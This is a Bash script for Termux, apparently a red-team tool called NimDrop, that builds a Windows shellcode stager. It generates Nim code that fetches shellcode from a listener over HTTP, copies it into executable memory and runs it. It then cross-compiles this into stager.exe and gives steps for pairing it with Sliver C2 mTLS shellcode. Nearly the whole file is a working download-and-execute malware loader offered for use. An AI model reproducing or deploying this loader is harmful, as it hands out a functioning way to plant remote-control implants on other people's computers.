#!/data/data/com.termux/files/usr/bin/bash

# NimDrop - Nim Shellcode Stager Builder for Termux
# Invadel Cybersecurity · invadel.com

BLUE="\\033[94m"
CYAN="\\033[96m"
DARK_BLUE="\\033[34m"
BOLD_BLUE="\\033[1;34m"
GREEN="\\033[92m"
YELLOW="\\033[93m"
RED="\\033[91m"
RESET="\\033[0m"

VERSION="1.0"

show_banner() {
    echo -e "${BLUE} ●┈┈● ${BOLD_BLUE}██╗███╗   ██╗██╗███╗   ███╗██████╗ ██████╗  ██████╗ ██████╗ ${RESET}"
    echo -e "${BLUE} ╱ ╲ ${BOLD_BLUE}██║████╗  ██║██║████╗ ████║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗${RESET}"
    echo -e "${BLUE}● ●┈┈● ${BOLD_BLUE}██║██╔██╗ ██║██║██╔████╔██║██████╔╝██║  ██║██║   ██║██████╔╝${RESET}"
    echo -e "${CYAN} ╲ ╱ ${BOLD_BLUE}██║██║╚██╗██║██║██║╚██╔╝██║██╔══██╗██║  ██║██║   ██║██╔══██╗${RESET}"
    echo -e "${CYAN} ●┈┈● ${BOLD_BLUE}██║██║ ╚████║██║██║ ╚═╝ ██║██║  ██║██████╔╝╚██████╔╝██║  ██║${RESET}"
    echo -e "${CYAN} ╲ ${BOLD_BLUE}╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝${RESET}"
    echo -e "${CYAN} ● ${DARK_BLUE}Invadel Cybersecurity · invadel.com${RESET}"
    echo -e "${CYAN} Version: ${VERSION}${RESET}\\n"
}

check_termux() {
    if [[ ! -d /data/data/com.termux ]]; then
        echo -e "${RED}[!] This tool is designed for Termux only${RESET}"
        exit 1
    fi
}

install_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${RESET}"

    # Update packages
    pkg update -y

    # Install required packages
    local deps=("python" "nim" "binutils" "git" "wget" "curl")

    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${YELLOW}[*] Installing $dep...${RESET}"
            pkg install -y $dep
        else
            echo -e "${GREEN}[+] $dep found${RESET}"
        fi
    done

    # Install mingw-w64 for cross-compilation
    if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        echo -e "${YELLOW}[*] Installing mingw-w64...${RESET}"
        pkg install -y mingw-w64
    fi

    # Install winim via nimble
    echo -e "${BLUE}[*] Installing winim...${RESET}"
    nimble install -y winim

    echo -e "${GREEN}[+] All dependencies installed${RESET}"
}

show_help() {
    echo "Usage: nimdrop -l <IP> -p <PORT> [options]"
    echo ""
    echo "Options:"
    echo "  -l, --ip IP          Listener IP address (required)"
    echo "  -p, --port PORT      HTTP port to serve shellc.bin (required)"
    echo "  -c, --c2-port PORT   Sliver C2 mTLS port (default: same as -p)"
    echo "  -h, --help           Show this help message"
    echo "  -v, --version        Show version information"
    echo ""
    echo "Examples:"
    echo "  nimdrop -l 192.168.1.100 -p 8080"
    echo "  nimdrop -l 10.0.0.1 -p 443 -c 8443"
    echo ""
}

show_version() {
    echo "NimDrop v${VERSION}"
    echo "Invadel Cybersecurity · invadel.com"
}

# Parse arguments
IP=""
PORT=""
C2_PORT=""

while [[ $# -gt 0 ]]; do
    case $1 in
        -l|--ip)
            IP="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -c|--c2-port)
            C2_PORT="$2"
            shift 2
            ;;
        -h|--help)
            show_banner
            show_help
            exit 0
            ;;
        -v|--version)
            show_banner
            show_version
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${RESET}"
            show_help
            exit 1
            ;;
    esac
done

# Validate required arguments
if [[ -z "$IP" ]] || [[ -z "$PORT" ]]; then
    echo -e "${RED}[!] IP and Port are required${RESET}"
    show_help
    exit 1
fi

# Set C2_PORT to PORT if not specified
C2_PORT="${C2_PORT:-$PORT}"

# Main execution
check_termux
show_banner

echo -e "${BLUE}[*] Installing dependencies...${RESET}"
install_dependencies

echo -e "${BLUE}[*] Generating stager.nim...${RESET}"

# Create stager.nim
cat > stager.nim << 'EOF'
import winim
import winim/lean
import httpclient

proc toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)
  var shellcode: seq[byte] = toByteSeq(response)

  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://{IP}:{PORT}/shellc.bin")
EOF

# Replace placeholders
sed -i "s/{IP}/${IP}/g" stager.nim
sed -i "s/{PORT}/${PORT}/g" stager.nim

echo -e "${GREEN}[+] stager.nim created${RESET}"

echo -e "${BLUE}[*] Cross-compiling to Windows EXE...${RESET}"

# Compile the Nim code
nim c -d:mingw \\
      --os:windows \\
      --cpu:amd64 \\
      --cc:gcc \\
      --gcc.exe:x86_64-w64-mingw32-gcc \\
      --gcc.linkerexe:x86_64-w64-mingw32-gcc \\
      -o:stager.exe \\
      stager.nim

if [[ -f "stager.exe" ]]; then
    echo -e "${GREEN}[+] stager.exe built successfully!${RESET}"
    echo ""
    echo -e "${BOLD_BLUE}============================================================${RESET}"
    echo -e "${GREEN}[+] Next Steps:${RESET}"
    echo -e "${BLUE}[*] Generate Sliver shellcode:${RESET}"
    echo -e "    ${YELLOW}generate --mtls ${IP}:${C2_PORT} --os windows --arch amd64 --format shellcode${RESET}"
    echo ""
    echo -e "${BLUE}[*] Rename the output to shellc.bin and host it:${RESET}"
    echo -e "    ${YELLOW}<http://$>{IP}:${PORT}/shellc.bin${RESET}"
    echo ""
    if [[ "$C2_PORT" != "$PORT" ]]; then
        echo -e "${BLUE}[*] Start Sliver mTLS listener on port ${C2_PORT}${RESET}"
    fi
    echo -e "${BOLD_BLUE}============================================================${RESET}"
else
    echo -e "${RED}[!] Build failed - stager.exe not found${RESET}"
    exit 1
fi
